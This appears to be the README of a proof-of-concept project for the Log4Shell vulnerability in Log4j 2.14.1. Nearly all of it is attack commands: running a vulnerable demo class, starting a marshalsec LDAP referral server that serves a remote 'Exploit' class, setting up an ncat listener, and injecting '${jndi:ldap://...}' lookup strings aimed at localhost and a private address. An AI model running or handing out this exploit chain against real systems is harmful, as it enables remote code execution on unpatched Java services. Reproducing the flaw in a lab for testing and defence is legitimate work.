

# Log4j-1.x.x



# Log4j-2.x.x

```bash
export CLASSPATH="lib/log4j-api-2.14.1.jar:lib/log4j-core-2.14.1.jar:target/classes"
java -cp $CLASSPATH au.com.tyo.logpoc.Innocent
```

# Test

## LDAP Server

### Using Marshalsec

```bash
cd ldap
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit" 8888
```

### Using NCAT
```
ncat -k -vv -c "echo ---CONNECTION [%NCAT_REMOTE_PORT%]--- 1>&2" -l 7777
```

## Exploit

```bash
java -cp $CLASSPATH au.com.tyo.logpoc.Innocent '${jndi:ldap://localhost:8888/Exploit}'
```

```bash
java -cp $CLASSPATH au.com.tyo.logpoc.Innocent '${jndi:ldap://localhost:7777/Exploit}'
java -cp $CLASSPATH au.com.tyo.logpoc.Innocent '${jndi:ldap://192.168.65.214:7777/Exploit}'

```
## Maintainer 

[Eric Tang](https://www.twitter.com/_e_tang)

